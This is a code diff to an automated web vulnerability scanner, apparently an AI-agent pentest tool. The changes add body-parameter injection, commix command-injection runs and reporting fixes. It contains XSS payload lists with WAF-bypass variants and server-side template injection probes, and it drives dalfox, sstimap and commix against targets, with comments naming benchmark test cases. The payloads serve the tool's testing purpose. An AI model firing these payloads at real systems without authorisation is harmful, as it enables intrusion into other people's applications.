@@ -77,6 +77,9 @@ class RequestConfig:
     cookies: Dict[str, str] = None
     headers: Dict[str, str] = None
 
+    def inject_in_body(self):
+        return self.http_method.upper() in ["POST", "PUT", "PATCH", "DELETE"]
+
 
 @tool
 def advanced_payload_coordinator(
@@ -139,7 +142,7 @@ def advanced_payload_coordinator(
         "test_type": test_type,
         "http_method": request_config.http_method,
         "parameters_provided": parameters,
-        "tools": {"available": [], "failed": [], "success": True},
+        "tools": {"available": [], "failed": []},
         "parameters_discovered": [],
         "payload_results": [],
         "vulnerabilities": [],
@@ -269,7 +272,7 @@ def advanced_payload_coordinator(
 
 def _setup_payload_tools() -> Dict[str, Any]:
     """Setup specialized payload testing tools"""
-    tools_status = {"success": True, "tools": [], "failed": []}
+    tools_status = {"tools": [], "failed": []}
 
     # Specialized tools from awesome-bugbounty-tools
     specialized_tools = [
@@ -298,10 +301,9 @@ def _setup_payload_tools() -> Dict[str, Any]:
                     tools_status["tools"].append(tool_name)
                 else:
                     tools_status["failed"].append(tool_name)
-                    tools_status["success"] = False
             else:
                 # Python tool - try pip install
-                pip_names = {"arjun": "arjun", "corsy": "corsy", "sstimap": "sstimap", "paramspider": "ParamSpider"}
+                pip_names = {"arjun": "arjun", "corsy": "corsy", "sstimap": "sstimap", "paramspider": "ParamSpider", "commix": "commix"}
                 if tool_name in pip_names:
                     install_cmd = ["pip3", "install", pip_names[tool_name]]
                     result = subprocess.run(install_cmd, stdin=DEVNULL, capture_output=True, timeout=120)
@@ -309,14 +311,8 @@ def _setup_payload_tools() -> Dict[str, Any]:
                         tools_status["tools"].append(tool_name)
                     else:
                         tools_status["failed"].append(tool_name)
-                        tools_status["success"] = False
         except Exception:
             tools_status["failed"].append(tool_name)
-            tools_status["success"] = False
-
-    # Ensure success reflects reality even if no exceptions were raised
-    if tools_status["failed"]:
-        tools_status["success"] = False
 
     return tools_status
 
@@ -336,16 +332,19 @@ def _advanced_parameter_discovery(request_config: RequestConfig, provided_params
     # Method 1: Arjun parameter discovery (if available)
     if "arjun" in tools:
         arjun_out = ""
+        arjun_path = None
         try:
-            with tempfile.NamedTemporaryFile(prefix="arjun", suffix=".json", delete=True, mode="w") as f:
-                f.close()
+            try:
+                with tempfile.NamedTemporaryFile(prefix="arjun", suffix=".json", delete=False) as f:
+                    arjun_path = f.name
+
                 cmd = [
                     "arjun",
                     "-u", target_url,
                     "-m", request_config.http_method,
                     "-T", "20",
                     # "--stable",
-                    "-oJ", f.name,
+                    "-oJ", arjun_path,
                 ]
                 headers = []
                 if request_config.headers:
@@ -358,8 +357,8 @@ def _advanced_parameter_discovery(request_config: RequestConfig, provided_params
                 result = subprocess.run(cmd, capture_output=True, text=True, stdin=DEVNULL, timeout=300)
 
                 if result.returncode == 0:
-                    if os.path.exists(f.name) and os.stat(f.name).st_size > 0:
-                        with open(f.name, "rb") as oj:
+                    if arjun_path and os.path.exists(arjun_path) and os.stat(arjun_path).st_size > 0:
+                        with open(arjun_path, "rb") as oj:
                             result_json = json.loads(oj.read())
                         for url_output in result_json.values():
                             if "params" in url_output:
@@ -367,6 +366,12 @@ def _advanced_parameter_discovery(request_config: RequestConfig, provided_params
                                     discovered_params.add(param)
                     if result.stdout:
                         arjun_out = result.stdout
+            finally:
+                if arjun_path and os.path.exists(arjun_path):
+                    try:
+                        os.unlink(arjun_path)
+                    except Exception:
+                        pass
         except subprocess.TimeoutExpired as e:
             arjun_out = _coerce_str(e.stdout)
         except Exception:
@@ -509,10 +514,17 @@ def _requests_get_text(url: str, params: Dict[str, Any], request_config: Request
                        timeout: int = 10) -> str | None:
     """GET a URL and return response text, or None on error."""
     try:
+        if request_config.inject_in_body():
+            query_params = None
+            data = params
+        else:
+            query_params = params
+            data = None
         resp = requests.request(
             request_config.http_method,
             url,
-            params=params,
+            params=query_params,
+            data=data,
             headers=request_config.headers,
             cookies=request_config.cookies,
             timeout=timeout,
@@ -708,6 +720,9 @@ def _coordinate_xss_testing(request_config: RequestConfig, parameters: List[str]
                 for name, value in request_config.headers.items():
                     cmd.extend(["--header", f"{name}: {value}"])
 
+            if request_config.inject_in_body():
+                cmd.extend(["--data", "&".join([f"{param}=test" for param in dalfox_params])])
+
             for param in dalfox_params:
                 cmd.extend(["--param", param])
 
@@ -735,21 +750,38 @@ def _coordinate_xss_testing(request_config: RequestConfig, parameters: List[str]
                             payload_list.append(payload)
                     except Exception:
                         continue
+            reflected_found_count = 0  # limit how many reflected payloads we report
             for payload in payload_list:
-                if payload.get("type", "") == "V" and "param" in payload:
+                if "param" not in payload:
+                    continue
+                if payload.get("type", "") == "V":
                     dalfox_params.discard(payload["param"])
                     xss_results.append(
                         {
-                            "parameter": payload["param"],
                             "vulnerable": True,
+                            "url": target_url,
+                            "parameter": payload["param"],
+                            "method": payload.get("method", request_config.http_method),
                             "payload_type": f"Advanced XSS ({payload['inject_type']})",
-                            "url": payload.get("data", None),
-                            "method": request_config.http_method,
                             "payload": payload.get("payload", None),
                             "evidence": payload.get("message_str", payload.get("evidence", "")),
                             "tool": "dalfox",
                         }
                     )
+                elif payload.get("type", "") == "R" and reflected_found_count < 2:
+                    xss_results.append(
+                        {
+                            "vulnerable": False,
+                            "url": target_url,
+                            "parameter": payload["param"],
+                            "method": payload.get("method", request_config.http_method),
+                            "payload_type": f"Advanced XSS ({payload['inject_type']})",
+                            "payload": payload.get("payload", None),
+                            "evidence": payload.get("message_str", payload.get("evidence", "")),
+                            "tool": "dalfox",
+                        }
+                    )
+                    reflected_found_count += 1
             if not dalfox_timeout:
                 for param in dalfox_params:
                     xss_results.append(
@@ -757,39 +789,50 @@ def _coordinate_xss_testing(request_config: RequestConfig, parameters: List[str]
                     )
 
     # Method 2: Modern XSS payloads with realistic exploitation context
-    advanced_xss_payloads = [
-        # Basic reflection tests
-        "<script>alert(1)</script>",
-        "javascript:alert(1)",
-        "<img src=x onerror=alert(1)>",
-        "<svg onload=alert(1)>",
-        # Context-aware payloads
-        "'\\\"><script>alert(1)</script>",  # Breaking out of attributes
-        "\\\";alert(1);//",  # Breaking out of JavaScript strings
-        "<iframe src=javascript:alert(1)>",
-        # Modern DOM-based
-        "<input onfocus=alert(1) autofocus>",
-        "<body onload=alert(1)>",
-        "<details open ontoggle=alert(1)>",
-        # WAF bypass variants
-        "<svg/onload=alert(1)>",  # No space after tag
-        "<<script>alert(1)</script>",  # Double tag
-        "<script>alert`1`</script>",  # Template literals
-        "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
-        "<svg><script>alert(1)</script></svg>",  # SVG context
-        # Polyglot attempts
-        "'\\\"><svg/onload=alert(1)>",
-    ]
+    advanced_xss_payload_files = [ "/usr/share/seclists/Fuzzing/XSS/robot-friendly/XSS-Cheat-Sheet-PortSwigger.txt" ]
+    advanced_xss_payloads = None
+    for file in advanced_xss_payload_files:
+        if os.path.isfile(file) and os.access(file, os.R_OK):
+            try:
+                advanced_xss_payloads = open(file).read().splitlines()
+                if advanced_xss_payloads:
+                    break
+            except Exception:
+                pass
+    if not advanced_xss_payloads:
+        advanced_xss_payloads = [
+            # Basic reflection tests
+            "<script>alert(1)</script>",
+            "javascript:alert(1)",
+            "<img src=x onerror=alert(1)>",
+            "<svg onload=alert(1)>",
+            # Context-aware payloads
+            "'\\\"><script>alert(1)</script>",  # Breaking out of attributes
+            "\\\";alert(1);//",  # Breaking out of JavaScript strings
+            "<iframe src=javascript:alert(1)>",
+            # Modern DOM-based
+            "<input onfocus=alert(1) autofocus>",
+            "<body onload=alert(1)>",
+            "<details open ontoggle=alert(1)>",
+            # WAF bypass variants
+            "<svg/onload=alert(1)>",  # No space after tag
+            "<<script>alert(1)</script>",  # Double tag
+            "<script>alert`1`</script>",  # Template literals
+            "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
+            "<svg><script>alert(1)</script></svg>",  # SVG context
+            # Polyglot attempts
+            "'\\\"><svg/onload=alert(1)>",
+        ]
 
     # Test parameters not covered by dalfox
     tested_params = {r["parameter"] for r in xss_results}
     remaining_params = [p for p in parameters if p not in tested_params]
 
     for param in remaining_params:
+        encoded_found_count = 0  # limit how many encoded params we report
         for payload in advanced_xss_payloads:
             try:
                 # Create test request
-                test_url = _add_or_replace_query_param(target_url, param, payload)
                 response = _requests_get_text(target_url, {param: payload}, request_config, timeout=10)
                 if response is not None:
                     # Reflection tests: detect raw OR encoded reflections.
@@ -801,32 +844,34 @@ def _coordinate_xss_testing(request_config: RequestConfig, parameters: List[str]
                     raw_present = payload in response
                     encoded_present = any(v in response for v in (html_encoded, hex_encoded, uni_encoded))
 
-                    if raw_present or encoded_present:
-                        if raw_present and not encoded_present:
-                            xss_results.append(
-                                {
-                                    "parameter": param,
-                                    "vulnerable": True,
-                                    "payload_type": "Reflected XSS (unencoded)",
-                                    "url": test_url,
-                                    "method": request_config.http_method,
-                                    "payload": payload,
-                                    "evidence": f"Payload reflected unencoded: {payload[:50]}...",
-                                    "tool": "custom",
-                                }
-                            )
-                            break  # Found candidate, no need to test more payloads
-                        else:
-                            xss_results.append(
-                                {
-                                    "parameter": param,
-                                    "vulnerable": False,
-                                    "payload_type": "Reflected but encoded (not exploitable)",
-                                    "evidence": "Payload reflected with encoding",
-                                    "tool": "custom",
-                                }
-                            )
-                            break
+                    if raw_present:
+                        xss_results.append(
+                            {
+                                "vulnerable": True,
+                                "url": target_url,
+                                "parameter": param,
+                                "method": request_config.http_method,
+                                "payload_type": "Reflected XSS (unencoded)",
+                                "payload": {param: payload},
+                                "evidence": f"Payload reflected unencoded: {payload[:50]}...",
+                                "tool": "custom",
+                            }
+                        )
+                        break  # Found candidate, no need to test more payloads
+                    elif encoded_present and encoded_found_count < 2:
+                        xss_results.append(
+                            {
+                                "vulnerable": False,
+                                "url": target_url,
+                                "parameter": param,
+                                "method": request_config.http_method,
+                                "payload_type": "Reflected but encoded (not exploitable)",
+                                "payload": {param: payload},
+                                "evidence": "Payload reflected with encoding",
+                                "tool": "custom",
+                            }
+                        )
+                        encoded_found_count += 1
 
             except Exception:
                 continue
@@ -956,17 +1001,17 @@ def _coordinate_injection_testing(
 
     # Template injection payloads
     template_payloads = [
-        "42*42"
-        "{42*42}"
-        "{{42*42}}"
-        "{{{42*42}}}"
-        "#{42*42}"
-        "${42*42}"
-        "<%=42*42 %>"
-        "{{=42*42}}"
-        "{^xyzm42}1764{/xyzm42}"
-        "${donotexists|42*42}"
-        "[[${42*42}]]"
+        "42*42",
+        "{42*42}",
+        "{{42*42}}",
+        "{{{42*42}}}",
+        "#{42*42}",
+        "${42*42}",
+        "<%=42*42 %>",
+        "{{=42*42}}",
+        "{^xyzm42}1764{/xyzm42}",
+        "${donotexists|42*42}",
+        "[[${42*42}]]",
         "{{config.items()}}",
         "${T(java.lang.System).getProperty('user.name')}",
     ]
@@ -1001,15 +1046,15 @@ def _coordinate_injection_testing(
     # SSTImap
     # XBEN-044-24 is a good test case. Target the '/' endpoint, 'name' parameter, POST method.
     if "sstimap" in tools and (not focus or "SSTI" in focus):
-        sstimap_out = ""
-        sstimap_timeout = False
-        try:
-            for param in parameters_under_test.copy():
-                if request_config.http_method.upper() == "GET":
-                    test_url = _add_or_replace_query_param(target_url, param, "*")
-                else:
-                    test_url = target_url
+        for param in parameters_under_test.copy():
+            if request_config.inject_in_body():
+                test_url = target_url
+            else:
+                test_url = _add_or_replace_query_param(target_url, param, "*")
 
+            sstimap_out = ""
+            sstimap_timeout = False
+            try:
                 cmd = [
                     "sstimap",
                     "--no-color",
@@ -1019,7 +1064,7 @@ def _coordinate_injection_testing(
                     "--method", request_config.http_method,
                 ]
 
-                if request_config.http_method.upper() != "GET":
+                if request_config.inject_in_body():
                     cmd.extend(["--data", f"{param}=*"])
 
                 if request_config.cookies:
@@ -1034,26 +1079,26 @@ def _coordinate_injection_testing(
 
                 if result.returncode == 0 and result.stdout:
                     sstimap_out = result.stdout
-        except subprocess.TimeoutExpired as e:
-            sstimap_out = _coerce_str(e.stdout)
-            sstimap_timeout = True
-        except Exception:
-            pass
+            except subprocess.TimeoutExpired as e:
+                sstimap_out = _coerce_str(e.stdout)
+                sstimap_timeout = True
+            except Exception:
+                pass
 
-        if sstimap_out:
-            ssti_findings = _parse_sstimap_output(sstimap_out)
-            # Attach URL context and ensure parameter consistency with the param under test.
-            for f in ssti_findings:
-                # Prefer the parsed parameter, but if it's missing/unknown, use our loop param.
-                if not f.get("parameter") or f.get("parameter") == "(unknown)":
-                    f["parameter"] = param
-                f["url"] = test_url
-                f["method"] = request_config.http_method
-                # Mark that this parameter was found vulnerable so we don't add a negative summary later.
-                injection_results.append(f)
-                parameters_under_test.discard(param)
-                if not sstimap_timeout and focus:
-                    injection_types = [x for x in injection_types if x[0] != "SSTI"]
+            if sstimap_out:
+                ssti_findings = _parse_sstimap_output(sstimap_out)
+                # Attach URL context and ensure parameter consistency with the param under test.
+                for f in ssti_findings:
+                    # Prefer the parsed parameter, but if it's missing/unknown, use our loop param.
+                    if not f.get("parameter") or f.get("parameter") == "(unknown)":
+                        f["parameter"] = param
+                    f["url"] = test_url
+                    f["method"] = request_config.http_method
+                    # Mark that this parameter was found vulnerable so we don't add a negative summary later.
+                    injection_results.append(f)
+                    parameters_under_test.discard(param)
+                    if not sstimap_timeout and focus:
+                        injection_types = [x for x in injection_types if x[0] != "SSTI"]
 
     # command injection
     # XBEN-073-24
@@ -1062,7 +1107,7 @@ def _coordinate_injection_testing(
         commix_timeout = False
         try:
             test_url = target_url
-            if request_config.http_method.upper() == "GET":
+            if not request_config.inject_in_body():
                 for param in parameters_under_test:
                     test_url = _add_or_replace_query_param(test_url, param, "test")
 
@@ -1082,7 +1127,7 @@ def _coordinate_injection_testing(
                 "--method="+request_config.http_method,
             ]
 
-            if request_config.http_method.upper() in ["POST", "PUT", "PATCH"]:
+            if request_config.inject_in_body():
                 cmd.extend(["-d", "&".join([f"{param}=test" for param in parameters_under_test])])
 
             headers = []
@@ -1115,10 +1160,10 @@ def _coordinate_injection_testing(
                     injection_results.append(
                         {
                             "vulnerable": True,
-                            "injection_type": "Command Injection",
+                            "url": target_url,
                             "parameter": param,
-                            "url": test_url,
                             "method": request_config.http_method,
+                            "injection_type": "Command Injection",
                             "evidence": "commix",
                             "tool": "commix",
                         }
@@ -1131,7 +1176,6 @@ def _coordinate_injection_testing(
         for injection_type, payloads in injection_types:
             for payload in payloads:
                 try:
-                    test_url = _add_or_replace_query_param(target_url, param, payload)
                     response = _requests_get_text(target_url, {param: payload}, request_config, timeout=10)
                     if response is not None:
                         # Check for injection indicators
@@ -1167,10 +1211,10 @@ def _coordinate_injection_testing(
                             injection_results.append(
                                 {
                                     "vulnerable": True,
-                                    "injection_type": injection_type,
+                                    "url": target_url,
                                     "parameter": param,
-                                    "url": test_url,
                                     "method": request_config.http_method,
+                                    "injection_type": injection_type,
                                     "payload": payload,
                                     "evidence": evidence,
                                     "tool": "custom",
@@ -1193,8 +1237,10 @@ def _coordinate_injection_testing(
             injection_results.append(
                 {
                     "vulnerable": False,
-                    "injection_type": "Multiple injection types",
+                    "url": target_url,
                     "parameter": param,
+                    "method": request_config.http_method,
+                    "injection_type": ", ".join(sorted(focus_injection_types)) if focus_injection_types else "Multiple injection types",
                     "tool": "custom",
                 }
             )
@@ -1243,9 +1289,10 @@ def _analyze_payload_intelligence(payload_results: List[Dict[str, Any]]) -> Dict
     for result in payload_results:
         ev = str(result.get("evidence", ""))
         pl = str(result.get("payload", ""))
+        pt = str(result.get("payload_type", ""))
         if "WAF" in ev.upper():
             intelligence["bypass_techniques"].append("waf_evasion")
-        if "encoded" in pl.lower():
+        if "encoded" in pt.lower():
             intelligence["bypass_techniques"].append("encoding_bypass")
         if "String.fromCharCode" in pl:
             intelligence["bypass_techniques"].append("js_fromcharcode")
